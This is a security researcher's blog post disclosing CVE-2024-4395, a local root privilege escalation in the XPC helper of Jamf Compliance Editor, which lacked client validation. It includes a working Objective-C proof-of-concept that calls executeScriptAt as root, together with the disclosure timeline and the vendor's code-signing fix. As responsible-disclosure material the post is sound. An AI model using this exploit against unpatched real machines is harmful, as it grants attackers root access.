<!DOCTYPE html>
<html lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
<title>CVE-2024-4395: Jamf Compliance Editor Privilege Escalation | Mykola‚Äôs blog</title>
<meta name="generator" content="Jekyll v3.10.0" />
<meta property="og:title" content="CVE-2024-4395: Jamf Compliance Editor Privilege Escalation" />
<meta name="author" content="Mykola Grymalyuk" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Hm seems I might be writing more security blog posts than I expected ü§î. Well anyways, I‚Äôm here with another exploit! This time with Jamf Compliance Editor, and local privilege escalation through an unguarded XPC service üéâ" />
<meta property="og:description" content="Hm seems I might be writing more security blog posts than I expected ü§î. Well anyways, I‚Äôm here with another exploit! This time with Jamf Compliance Editor, and local privilege escalation through an unguarded XPC service üéâ" />
<link rel="canonical" href="/macos/2024/05/01/CVE-2024-4395.html" />
<meta property="og:url" content="/macos/2024/05/01/CVE-2024-4395.html" />
<meta property="og:site_name" content="Mykola‚Äôs blog" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2024-05-01T13:00:00+00:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="CVE-2024-4395: Jamf Compliance Editor Privilege Escalation" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Mykola Grymalyuk"},"dateModified":"2024-05-01T13:00:00+00:00","datePublished":"2024-05-01T13:00:00+00:00","description":"Hm seems I might be writing more security blog posts than I expected ü§î. Well anyways, I‚Äôm here with another exploit! This time with Jamf Compliance Editor, and local privilege escalation through an unguarded XPC service üéâ","headline":"CVE-2024-4395: Jamf Compliance Editor Privilege Escalation","mainEntityOfPage":{"@type":"WebPage","@id":"/macos/2024/05/01/CVE-2024-4395.html"},"url":"/macos/2024/05/01/CVE-2024-4395.html"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="/feed.xml" title="Mykola&apos;s blog" /></head>
<body><header class="site-header">

    <div class="wrapper"><a class="site-title" rel="author" href="/">
        <img src="/favicon.ico" alt="" class="favicon" width="45px" height="45px" style="margin-top: -7px;">
        Mykola&#39;s blog
      </a><nav class="site-nav">
          <input type="checkbox" id="nav-trigger" class="nav-trigger" />
          <label for="nav-trigger">
            <span class="menu-icon">
              <svg viewBox="0 0 18 15" width="18px" height="15px">
                <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
              </svg>
            </span>
          </label>
  
          <div class="trigger"><a class="page-link" href="/about-me/">About me</a><a class="page-link" href="/portfolio/">Portfolio</a><a class="page-link" href="/contact/">Contact</a></div>
        </nav></div>
  </header><main class="page-content" aria-label="Content">
      <div class="wrapper">
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">

  <header class="post-header">
    <h1 class="post-title p-name" itemprop="name headline">CVE-2024-4395: Jamf Compliance Editor Privilege Escalation</h1>
    <p class="post-meta">
      <time class="dt-published" datetime="2024-05-01T13:00:00+00:00" itemprop="datePublished">May 1, 2024
      </time></p>
  </header>

  <div class="post-content e-content" itemprop="articleBody">
    <p>Hm seems I might be writing more security blog posts than I expected ü§î. Well anyways, I‚Äôm here with another exploit! This time with <a href="https://trusted.jamf.com/docs/establishing-compliance-baselines">Jamf Compliance Editor</a>, and local privilege escalation through an unguarded XPC service üéâ</p>

<p>And while this blog post is a demonstration of privilege escalation, <a href="https://trusted.jamf.com/docs/establishing-compliance-baselines">Jamf Compliance Editor</a> is genuinely a great free tool! Highly recommend it for anyone looking to <a href="https://support.apple.com/en-ca/guide/certifications/apc322685bb2/web">create compliance baselines for macOS</a>.</p>

<hr />

<ul>
  <li>Resolved version: v1.3.1 and newer
    <ul>
      <li>Official Source: <a href="https://trusted.jamf.com/docs/establishing-compliance-baselines">Establishing Compliance Baselines</a></li>
      <li>Mirrors:
        <ul>
          <li><a href="https://archive.org/download/jamf-compliance-editor-v-1.3/v1.3.1/JamfComplianceEditor%20v1.3.1.pkg">Archive.org</a></li>
        </ul>
      </li>
    </ul>
  </li>
  <li>Affected versions: v1.3 and older
    <ul>
      <li>Mirrors:
        <ul>
          <li><a href="https://archive.org/download/jamf-compliance-editor-v-1.3/v1.3/Jamf%20Compliance%20Editor%20v1.3.tar">Archive.org</a></li>
        </ul>
      </li>
    </ul>
  </li>
  <li>Proof of Concept:
    <ul>
      <li>Source Code: <a href="/Binaries/Jamf%20Compliance%20Editor/jce_exploit.m">jce_exploit.m</a></li>
      <li>Video Demo: <a href="/Binaries/Jamf%20Compliance%20Editor/Exploit%20Demo.mov">Exploit Demo.mov</a></li>
    </ul>
  </li>
  <li>CVE Associated: CVE-2024-4395</li>
  <li>Compensation: $500 USD</li>
</ul>

<hr />

<ul>
  <li><a href="#discovering-the-vulnerability">Discovering the vulnerability</a></li>
  <li><a href="#fun-fact-you-need-to-actually-use-the-apps-youre-reversing-sometimes">Fun Fact: You need to actually use the apps you‚Äôre reversing sometimes</a></li>
  <li><a href="#creating-a-proof-of-concept">Creating a Proof of Concept</a></li>
  <li><a href="#reporting-process">Reporting Process</a></li>
  <li><a href="#a-vendor-that-listens">A vendor that listens?!?</a></li>
  <li><a href="#verifying-jamfs-work">Verifying Jamf‚Äôs work</a></li>
  <li><a href="#conclusion">Conclusion</a></li>
</ul>

<h2 id="discovering-the-vulnerability">Discovering the vulnerability</h2>

<p>So I have this very, very bad habit. Every application I download, I reverse engineer it to get an idea of how it works‚Ä¶ This becomes a problem when I have actual work to do, like researching NIST compliance at work.</p>

<p>Well, that‚Äôs how I found <a href="https://trusted.jamf.com/docs/establishing-compliance-baselines">Jamf Compliance Editor</a>, an amazing GUI application that handles the creation of baselines and even performs audits of your machine.</p>

<p>When I downloaded it, I checked to see what files were bundled inside. Here I noticed a Launch Daemon, which intrigued me:</p>

<p><img src="/images/posts/2024-05-01-CVE-2024-4395/JCE%201.3%20-%20Directory.png" alt="" /></p>

<p>Following the Launch Daemon‚Äôs <code class="language-plaintext highlighter-rouge">BundleProgram</code> property, we see it points to <code class="language-plaintext highlighter-rouge">Contents/Resources/com.jamf.complianceeditor.helper</code>. When I opened this XPC executable up in Hopper Disassembler, my first thought was ‚ÄúI wonder how Jamf performs client validation, maybe they have a neat method‚Äù:</p>

<p><img src="/images/posts/2024-05-01-CVE-2024-4395/JCE%201.3%20-%20Hopper%20-%20shouldAccept.png" alt="" /></p>

<p>Wait a minute, there‚Äôs a problem here‚Ä¶ Where‚Äôs the client validation?</p>

<ul>
  <li>See these many amazing blogs and presentations on why that‚Äôs terrifying:
    <ul>
      <li><a href="https://wojciechregula.blog/post/learn-xpc-exploitation-part-1-broken-cryptography/">Wojciech Regu≈Ça: Learn XPC exploitation - Broken cryptography</a></li>
      <li><a href="https://objectivebythesea.org/v3/talks/OBTS_v3_wRegu≈Ça.pdf">Wojciech Regu≈Ça: Abusing &amp; Securing XPC in macOS apps</a></li>
      <li><a href="https://theevilbit.github.io/posts/secure_coding_xpc_part3/">Csaba Fitzl: CVE-2020-0984 - Secure coding XPC Services</a></li>
      <li><a href="https://obdev.at/blog/what-we-have-learned-from-a-vulnerability/">Christian S: The Story Behind CVE-2019-13013</a></li>
      <li><a href="https://erikberglund.github.io/2016/No_Privileged_Helper_Tool_Left_Behind/">Erik Berglund: No Privileged Helper Tool Left Behind</a></li>
    </ul>
  </li>
</ul>

<h2 id="fun-fact-you-need-to-actually-use-the-apps-youre-reversing-sometimes">Fun Fact: You need to actually use the apps you‚Äôre reversing sometimes</h2>

<p>Once I found that the XPC service lacked any client validation, I started to believe it was an unused binary. ‚ÄúNo way, Jamf wouldn‚Äôt forget to do validation‚Äù. However as I was reversing the core binary more, <code class="language-plaintext highlighter-rouge">Contents/MacOS/Jamf Compliance Editor</code>, I found that under <code class="language-plaintext highlighter-rouge">sub_100012060</code> the application does implement a code path to install the helper service:</p>

<p><img src="/images/posts/2024-05-01-CVE-2024-4395/JCE%201.3%20-%20Hopper%20-%20sub_100012060.png" alt="" /></p>

<p>However, when I first opened Jamf Compliance Editor, no launch services were installed‚Ä¶ How do I get this code path to kick in then?</p>

<p>Well after more time than I‚Äôd like to admit, I figured out the launch service is only installed if you perform an audit on the host. Otherwise, Jamf will just create all the baselines as the current user.</p>

<p>Steps to load the daemon:</p>
<ol>
  <li>Run Jamf Compliance Editor</li>
  <li>Create a new project</li>
  <li>Create Guidance</li>
  <li>Perform audit</li>
</ol>

<p>Step 4 is greyed out until a Guidance is created first:
<img src="/images/posts/2024-05-01-CVE-2024-4395/JCE%201.3%20-%20Create%20Guidance.png" alt="" /></p>

<p>And now the daemon is trying to be loaded!
<img src="/images/posts/2024-05-01-CVE-2024-4395/JCE%201.3%20-%20Loading%20Daemon.png" alt="" /></p>

<h2 id="creating-a-proof-of-concept">Creating a Proof of Concept</h2>

<p>Now that I confirmed the XPC service is being used, the next issue is actually proving it‚Äôs exploitable. Within the XPC‚Äôs helper class, I found this fun function:</p>

<div class="language-objc highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">-</span><span class="p">[</span><span class="n">com_jamf_complianceeditor_helper</span><span class="p">.</span><span class="n">Helper</span> <span class="nf">executeScriptAt</span><span class="p">:</span><span class="nf">arguments</span><span class="p">:</span><span class="n">then</span><span class="o">:</span><span class="p">]</span>
</code></pre></div></div>
<p><img src="/images/posts/2024-05-01-CVE-2024-4395/JCE%201.3%20-%20Hopper%20-%20executeScriptAt.png" alt="" /></p>

<p>An easy demonstration of local privilege escalation!</p>

<p>Now throw this into a quick Obj-C script (shout out to <a href="https://hackerone.com/reports/980876">Csaba Fitzl‚Äôs CVE-2021-26718</a> for the basis!) and we‚Äôre off to the races:</p>
<ul>
  <li><a href="/Binaries/Jamf%20Compliance%20Editor/jce_exploit.m">jce_exploit.m</a>
    <ul>
      <li>Note the rendered version below is simplified, the actual file contains the optional ability to pass custom commands to run as root.</li>
    </ul>
  </li>
</ul>

<div class="language-objc highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/*

Jamf Compliance Editor Helper Service - Local Privilege Escalation

------------------------------------------------------------------

Discovered by Mykola Grymalyuk of RIPEDA Consulting

------------------------------------------------------------------

Compile Steps:

   clang -framework Foundation -o jce_exploit jce_exploit.m

------------------------------------------------------------------

Exploit based on Csaba Fitzl's CVE-2021-26718:
- https://hackerone.com/reports/980876
*/</span>

<span class="cp">#import &lt;Foundation/Foundation.h&gt;
</span>

<span class="k">static</span> <span class="n">NSString</span><span class="o">*</span> <span class="n">kXPCHelperMachServiceName</span> <span class="o">=</span> <span class="s">@"com.jamf.complianceeditor.helper"</span><span class="p">;</span>

<span class="k">@protocol</span> <span class="nc">HelperExecutionService</span> <span class="o">&lt;</span><span class="n">NSObject</span><span class="o">&gt;</span>
<span class="k">-</span> <span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="nf">executeScriptAt</span><span class="p">:(</span><span class="n">NSString</span> <span class="o">*</span><span class="p">)</span><span class="nv">scriptPath</span> <span class="nf">arguments</span><span class="p">:(</span><span class="n">NSArray</span><span class="o">&lt;</span><span class="n">NSString</span> <span class="o">*&gt;</span> <span class="o">*</span><span class="p">)</span><span class="nv">arguments</span> <span class="nf">then</span><span class="p">:(</span><span class="kt">void</span> <span class="p">(</span><span class="o">^</span><span class="p">)(</span><span class="n">NSString</span> <span class="o">*</span><span class="n">result</span><span class="p">,</span> <span class="n">NSError</span> <span class="o">*</span><span class="n">error</span><span class="p">))</span><span class="nv">completionHandler</span><span class="p">;</span>
<span class="k">@end</span>


<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span> <span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
    <span class="k">@autoreleasepool</span> <span class="p">{</span>

        <span class="n">__block</span> <span class="kt">int</span> <span class="n">returnCode</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="n">NSString</span><span class="o">*</span> <span class="n">serviceName</span> <span class="o">=</span> <span class="n">kXPCHelperMachServiceName</span><span class="p">;</span>
        <span class="n">NSLog</span><span class="p">(</span><span class="s">@"Exploiting service: %@"</span><span class="p">,</span> <span class="n">serviceName</span><span class="p">);</span>

        <span class="n">NSXPCConnection</span><span class="o">*</span> <span class="n">serviceConnection</span> <span class="o">=</span> <span class="p">[[</span><span class="n">NSXPCConnection</span> <span class="nf">alloc</span><span class="p">]</span> <span class="nf">initWithMachServiceName</span><span class="p">:</span><span class="n">serviceName</span> <span class="nf">options</span><span class="p">:</span><span class="n">NSXPCConnectionPrivileged</span><span class="p">];</span>

        <span class="p">[</span><span class="n">serviceConnection</span> <span class="nf">setRemoteObjectInterface</span><span class="p">:[</span><span class="n">NSXPCInterface</span> <span class="nf">interfaceWithProtocol</span><span class="p">:</span><span class="k">@protocol</span><span class="err">(</span><span class="nc">HelperExecutionService</span><span class="p">)]];</span>
        <span class="p">[</span><span class="n">serviceConnection</span> <span class="nf">resume</span><span class="p">];</span>

        <span class="n">id</span> <span class="n">service</span> <span class="o">=</span> <span class="p">[</span><span class="n">serviceConnection</span> <span class="nf">remoteObjectProxyWithErrorHandler</span><span class="p">:</span><span class="o">^</span><span class="p">(</span><span class="n">NSError</span><span class="o">*</span> <span class="n">error</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">NSLog</span><span class="p">(</span><span class="s">@"Error connecting: %@"</span><span class="p">,</span> <span class="n">error</span><span class="p">);</span>
            <span class="n">returnCode</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
            <span class="n">exit</span><span class="p">(</span><span class="n">returnCode</span><span class="p">);</span>
        <span class="p">}];</span>

        <span class="n">NSString</span> <span class="o">*</span><span class="n">command</span> <span class="o">=</span> <span class="s">@"/usr/bin/whoami"</span><span class="p">;</span>
        <span class="n">NSArray</span> <span class="o">*</span><span class="n">arguments</span> <span class="o">=</span> <span class="p">@[];</span>

        <span class="n">NSLog</span><span class="p">(</span><span class="s">@"Executing '%@'"</span><span class="p">,</span> <span class="n">command</span><span class="p">);</span>

        <span class="p">[</span><span class="n">service</span> <span class="nf">executeScriptAt</span><span class="p">:</span><span class="n">command</span> <span class="nf">arguments</span><span class="p">:</span><span class="n">arguments</span> <span class="n">then</span><span class="o">:^</span><span class="p">(</span><span class="n">NSString</span> <span class="o">*</span><span class="n">result</span><span class="p">,</span> <span class="n">NSError</span> <span class="o">*</span><span class="n">error</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">error</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">NSLog</span><span class="p">(</span><span class="s">@"Error: %@"</span><span class="p">,</span> <span class="n">error</span><span class="p">);</span>
                <span class="n">returnCode</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                <span class="n">NSLog</span><span class="p">(</span><span class="s">@"Result: %@"</span><span class="p">,</span> <span class="n">result</span><span class="p">);</span>
            <span class="p">}</span>
            <span class="p">[</span><span class="n">serviceConnection</span> <span class="nf">invalidate</span><span class="p">];</span>
            <span class="n">exit</span><span class="p">(</span><span class="n">returnCode</span><span class="p">);</span>
        <span class="p">}];</span>

        <span class="p">[[</span><span class="n">NSRunLoop</span> <span class="nf">currentRunLoop</span><span class="p">]</span> <span class="nf">run</span><span class="p">];</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>And with that, the exploit works!
<img src="/images/posts/2024-05-01-CVE-2024-4395/Exploit%20-%20Demo.png" alt="" /></p>

<h2 id="reporting-process">Reporting Process</h2>

<p>Following the <a href="https://www.jamf.com/security/vulnerability-disclosure/">Jamf Vulnerability Disclosure Program</a>, we advised Jamf to add <a href="https://developer.apple.com/documentation/foundation/nsxpcconnection/3943309-setcodesigningrequirement?language=objc"><code class="language-plaintext highlighter-rouge">setCodeSigningRequirement</code></a> during the client connection process. Do note that <code class="language-plaintext highlighter-rouge">setCodeSigningRequirement</code> requires macOS 13.0, Ventura, or newer to use, which Jamf Compliance Editor already requires as a minimum. If your XPC service requires older OS support, use <a href="https://developer.apple.com/documentation/security/1396726-seccodecheckvalidity?language=objc"><code class="language-plaintext highlighter-rouge">SecCodeCheckValidity</code></a>.</p>

<ul>
  <li>Also notice the triage time? 3 minutes!!!</li>
</ul>

<table>
  <thead>
    <tr>
      <th style="text-align: left">Sender</th>
      <th style="text-align: left">Topic</th>
      <th style="text-align: left">Date</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align: left">RIPEDA</td>
      <td style="text-align: left">Initial Report - 90+30 Day Disclosure</td>
      <td style="text-align: left">1:45pm - February 21st, 2024</td>
    </tr>
    <tr>
      <td style="text-align: left">Jamf</td>
      <td style="text-align: left">Triaged, severity P2</td>
      <td style="text-align: left">1:48pm - February 21st, 2024</td>
    </tr>
    <tr>
      <td style="text-align: left">Jamf</td>
      <td style="text-align: left">Author of program notified, confirmed patch within 90 days</td>
      <td style="text-align: left">2:07pm - February 21st, 2024</td>
    </tr>
    <tr>
      <td style="text-align: left">Jamf</td>
      <td style="text-align: left">Patch created, ready to test</td>
      <td style="text-align: left">February 23rd, 2024</td>
    </tr>
    <tr>
      <td style="text-align: left">RIPEDA</td>
      <td style="text-align: left">Verified patch works, request for PKG distribution</td>
      <td style="text-align: left">February 23rd, 2024</td>
    </tr>
    <tr>
      <td style="text-align: left">Jamf</td>
      <td style="text-align: left">Confirmed PKG in process of being signed and notarized</td>
      <td style="text-align: left">February 29th, 2024</td>
    </tr>
    <tr>
      <td style="text-align: left">Jamf</td>
      <td style="text-align: left">Final PKG created, ready to test</td>
      <td style="text-align: left">March 14th, 2024</td>
    </tr>
    <tr>
      <td style="text-align: left">RIPEDA</td>
      <td style="text-align: left">Confirmed PKG resolves issue</td>
      <td style="text-align: left">March 15th, 2024</td>
    </tr>
    <tr>
      <td style="text-align: left">Jamf</td>
      <td style="text-align: left">JCE 1.3.1 releases</td>
      <td style="text-align: left">March 19th, 2024</td>
    </tr>
    <tr>
      <td style="text-align: left">Jamf</td>
      <td style="text-align: left">Notified us of 1.3.1</td>
      <td style="text-align: left">March 20th, 2024</td>
    </tr>
    <tr>
      <td style="text-align: left">Jamf</td>
      <td style="text-align: left">Slack message crediting us</td>
      <td style="text-align: left">March 22nd, 2024</td>
    </tr>
    <tr>
      <td style="text-align: left">RIPEDA</td>
      <td style="text-align: left">Reminded 30 day disclosure approaching, providing blog draft</td>
      <td style="text-align: left">April 15th, 2024</td>
    </tr>
    <tr>
      <td style="text-align: left">Jamf</td>
      <td style="text-align: left">Awarded $500 USD</td>
      <td style="text-align: left">April 15th, 2024</td>
    </tr>
    <tr>
      <td style="text-align: left">RIPEDA</td>
      <td style="text-align: left">Inquiring on CVE ID status</td>
      <td style="text-align: left">April 30th, 2024</td>
    </tr>
    <tr>
      <td style="text-align: left">Jamf</td>
      <td style="text-align: left">Waiting on CVE process</td>
      <td style="text-align: left">April 30th, 2024</td>
    </tr>
    <tr>
      <td style="text-align: left">Jamf</td>
      <td style="text-align: left">CVE-2024-4395 assigned</td>
      <td style="text-align: left">May 1st, 2024</td>
    </tr>
  </tbody>
</table>

<h2 id="a-vendor-that-listens">A vendor that listens?!?</h2>

<p>When we got the initial Jamf Compliance Editor fix, we raised a vulnerability concern related to the upgrade flow. Specifically if a user downloads 1.3.1 and replaces the app in <code class="language-plaintext highlighter-rouge">/Applications</code>, the vulnerable XPC service would still be active until it‚Äôs either either manually reloaded or the system reboots.</p>

<p>We proposed a solution through PKG distribution, and employing <a href="https://scriptingosx.com/2017/05/relocatable-package-installers-and-quickpkg-update/">pkgutil‚Äôs relocation support</a>.</p>

<p>The surprising part? They listened!</p>

<h2 id="verifying-jamfs-work">Verifying Jamf‚Äôs work</h2>

<p>Now when we load up v1.3.1‚Äôs XPC service, we see <code class="language-plaintext highlighter-rouge">shouldAcceptNewConnection</code> has a new function call:</p>

<p><img src="/images/posts/2024-05-01-CVE-2024-4395/JCE%201.3.1%20-%20Hopper%20-%20shouldAccept.png" alt="" /></p>

<p>Following it, we see Jamf has implemented the <a href="https://developer.apple.com/documentation/foundation/nsxpcconnection/3943309-setcodesigningrequirement?language=objc"><code class="language-plaintext highlighter-rouge">setCodeSigningRequirement</code></a> API which will verify the client against the following code signature:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>anchor apple generic and identifier \"com.jamf.complianceeditor\" and (certificate leaf[field.1.2.840.113635.100.6.1.9] /* exists */ or certificate 1[field.1.2.840.113635.100.6.2.6] /* exists */ and certificate leaf[field.1.2.840.113635.100.6.1.13] /* exists  */ and certificate leaf[subject.OU] = \"483DWKW443\")
</code></pre></div></div>

<ul>
  <li>Breakdown:
    <ul>
      <li><code class="language-plaintext highlighter-rouge">anchor apple generic</code>: Signed by Apple issued signing certificate</li>
      <li><code class="language-plaintext highlighter-rouge">com.jamf.complianceeditor</code>: Client Application Bundle Identifier</li>
      <li><code class="language-plaintext highlighter-rouge">certificate leaf[field.1.2.840.113635.100.6.1.9]</code>: Mac App Store</li>
      <li><code class="language-plaintext highlighter-rouge">certificate 1[field.1.2.840.113635.100.6.2.6]</code>: Developer ID Certificate</li>
      <li><code class="language-plaintext highlighter-rouge">certificate leaf[field.1.2.840.113635.100.6.1.13]</code>: Developer ID Leaf</li>
      <li><code class="language-plaintext highlighter-rouge">certificate leaf[subject.OU] = \"483DWKW443\"</code>: Jamf Team ID</li>
    </ul>
  </li>
  <li>References:
    <ul>
      <li><a href="https://developer.apple.com/library/archive/documentation/Security/Conceptual/CodeSigningGuide/RequirementLang/RequirementLang.html">Code Signing Requirement Language</a></li>
      <li><a href="https://github.com/apple-oss-distributions/Security/blob/ef677c3d667a44e1737c1b0245e9ed04d11c51c1/securityd/src/clientid.cpp#L170-L194">clientid.cpp</a></li>
      <li><a href="https://github.com/apple-oss-distributions/libsecurity_codesigning/blob/f2cc42c7b45d1c0d69f1551bd5b84adccf5fa821/lib/syspolicy.sql#L110-L122">syspolicy.sql</a></li>
    </ul>
  </li>
</ul>

<p><img src="/images/posts/2024-05-01-CVE-2024-4395/JCE%201.3.1%20-%20Hopper%20-%20setCodeSigning.png" alt="" /></p>

<p>And when we compare this to the main app‚Äôs code requirements, they match!</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/usr/bin/codesign --display --requirements - "/Applications/Jamf Compliance Editor.app"
</code></pre></div></div>
<p><img src="/images/posts/2024-05-01-CVE-2024-4395/Code%20Requirement.png" alt="" /></p>

<p>Now when we run our exploit, it fails as we‚Äôd expect üéâ
<img src="/images/posts/2024-05-01-CVE-2024-4395/Exploit%20-%20Patched.png" alt="" /></p>

<h2 id="conclusion">Conclusion</h2>

<p>I have to say, this disclosure process was one of the best I‚Äôve dealt with to date. My only real ‚Äúcritiques‚Äù were lack of compensation originally (which they later gave!) and proper credit initially (which after a request, we got a <a href="https://macadmins.slack.com/archives/C0158JKQTC5/p1711133060288599">shout-out on the MacAdmin‚Äôs Slack</a> with plans to credit us in the changelog on CVE publication!).</p>

<p>Happy to say we now have more secure MacAdmin software than before! üéâ</p>

  </div><a class="u-url" href="/macos/2024/05/01/CVE-2024-4395.html" hidden></a>
</article>

      </div>
    </main><footer class="site-footer h-card">
  <div class="wrapper">
    <h2 class="footer-heading">Mykola&#39;s blog</h2>
    <div class="footer-col-wrapper">
      <div class="footer-col">
        <ul class="contact-list">
          <li class="p-name">Mykola Grymalyuk</li>
          
        </ul>
      </div>
      <div class="footer-col footer-col-2"><ul class="social-media-list"><li>
  <a rel="me" href="https://twitter.com/khronokernel" target="_blank" title="twitter">
    <svg class="svg-icon grey">
      <use xlink:href="/assets/minima-social-icons.svg#twitter"></use>
    </svg>
  </a>
</li><li>
  <a rel="me" href="https://www.linkedin.com/in/mykola-grymalyuk" target="_blank" title="linkedin">
    <svg class="svg-icon grey">
      <use xlink:href="/assets/minima-social-icons.svg#linkedin"></use>
    </svg>
  </a>
</li><li>
  <a rel="me" href="https://github.com/khronokernel" target="_blank" title="github">
    <svg class="svg-icon grey">
      <use xlink:href="/assets/minima-social-icons.svg#github"></use>
    </svg>
  </a>
</li></ul></div>

      <div class="footer-col footer-col-3">
        <p>Blog dedicated to my rambles, including reverse engineering macOS internals, OS modding and documenting my cursed work.
</p>
      </div>
    </div>
  </div>
</footer>
</body>

</html>
